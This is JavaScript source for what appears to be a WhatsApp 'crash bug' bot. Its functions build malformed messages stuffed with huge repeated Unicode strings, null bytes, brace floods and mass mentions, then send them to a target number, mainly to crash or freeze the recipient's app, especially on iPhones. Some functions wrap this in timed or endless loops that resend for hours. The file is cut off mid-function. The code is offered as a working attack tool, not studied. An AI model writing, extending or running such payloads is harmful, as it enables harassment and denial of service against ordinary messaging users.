 async function NanBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "💧𝐅𝐎𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐑💧" + "ી".repeat(100000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(100000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}       

async function NanCrashiPhone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "💧𝐅𝐎𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐑💧"+ "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "💧𝐅𝐎𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐑💧" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

+async function ameliacombo1(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 100) {
            await Promise.all([
            ameliavisble1(target, true),
            ]);
            console.log(chalk.red(`Proses Send Bug ${count}/100 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Send Bug 100 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 100 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();
}			

async function ameliacrashios(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 5) {
            await Promise.all([
            NanBlankIphone(target, true),
            NanCrashiPhone(target, true),
            ]);
            console.log(chalk.red(`Proses Send Bug ${count}/5 to ${target}`));
            count++;
            setTimeout(sendNext, 5);
        } else {
            console.log(chalk.green(`✅ Success Send Bug 5 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 5 Messages"));
            setTimeout(sendNext, 5);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 5);
    }
};

sendNext();
}			
async function BlackDelayCrash(target, mention) {
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "BLACK OWL",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "Black Owl Bot",
            paramsJson: "\u0000".repeat(999999),
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            forwardedNewsletterMessageInfo: {
              newsletterName: "( @Vampiresagara )",
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            type: 25
          },
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "BlackOwlBOT" },
              content: undefined
            }
          ]
        }
      }
    }, {});
  }
  console.log(chalk.red("Black Owl Success Sending Delay Crash Bug"));
}
async function LocationSpam(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Hitam Kau Dekkkk!",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "https://nandonotdevloper@gmail.com",
                address: "( 𖣂 ) Nando Is Here ៚",
              },
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function killui(target, Ptcp = true) {
console.log(chalk.red({target}));
      await sock.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "饝箔饝箔饾棩饾棶饾棿饾\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
async function iosinVisFC(sheesh, jid, mention) {
console.log(chalk.red(`Succes Sending to ${jid}`))
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); // Trigger1
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, //Trigger 5
            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};
  async function VampireSpamNotif(target, Ptcp = true) {
  await sock.relayMessage(target, {
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "9999999999999999",
                          pageCount: 0x9184e729fff,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: "𝐒𝐇𝐈𝐍𝐁𝐈 𝐂𝐑𝐀𝐒𝐇 𝐈𝐒 𝐇𝐀𝐑𝐄",
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                          mediaKeyTimestamp: "1715880173",
                          contactVcard: true
                      },
                      title: "VINNXBOT BLANK" ,
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                  },
                  nativeFlowMessage: {},
                  contextInfo: {
                      mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                      groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                  }
              }
          }
      }
  }, { participant: { jid: target } }, { messageId: null });
}
async function ZieeInvisForceIOS(sock, target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "Z1ee - Tryhards ¿?" + "\u0000".repeat(70000) + "𑇂𑆵𑆴𑆿".repeat(60000),
        url: "https://github.com/urz1ee",
        contextInfo: {
          externalAdReply: {
            quotedAd: {
              advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
              mediaType: "IMAGE",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
              caption: "@Urz1ee" + "𑇂𑆵𑆴𑆿".repeat(70000)
            },
            placeholderKey: {
              remoteJid: "0s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key?.id || Math.random().toString(36).slice(2),
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target }
              }
            ]
          }
        ]
      }
    ]
  });
}
async function XProtexHardCore(target) {
 try {
  const cards = [];
  const header = {
    videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
       contextInfo: {},
       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "XProtex" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰VINNXBOT INFINITYཀ͜͡🪅" + "ោ៝".repeat(10000),
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net"],
            externalAdReply: {
              title: "{ 🧬⃟༑⌁⃰VINNXBOT INFINITYཀ͜͡🪅 }",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://nekopoi/care",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };
  
  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🧬⃟༑⌁⃰VINNXBOT INFINITYཀ͜͡🪅" + "ោ៝".repeat(10000),
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "XProtex" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "🧬⃟༑⌁⃰VINNXBOT INFINITYཀ͜͡🪅",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://XProtex-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "🧬⃟༑⌁⃰VinnXRulz Glowཀ͜͡🪅" + "ោ៝".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{".repeat(20000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
  //relayMessagePertama  
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  //relayMessageKedua
  await sock.relayMessage(target, msg2.message, {
    participant: { jid: target },
    messageId: msg2.key.id
  });
  
  console.log(chalk.red(`Succes Sending Bug FcHardCore To ${target}`));
 } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}
async function Fc1msg(socket, target) {
  try {
    let msg = {
      interactiveMessage: {
        body: { text: "punten paket" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    while (true) {
      const msg = generateWAMessageFromContent(target, msg, {});

      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 1 * 1000));
    }
  } catch (err) {
    console.error(err);
  }
}
async function StupidSql(jid) {
  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "VINNXBOT GACOR GA?😹",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
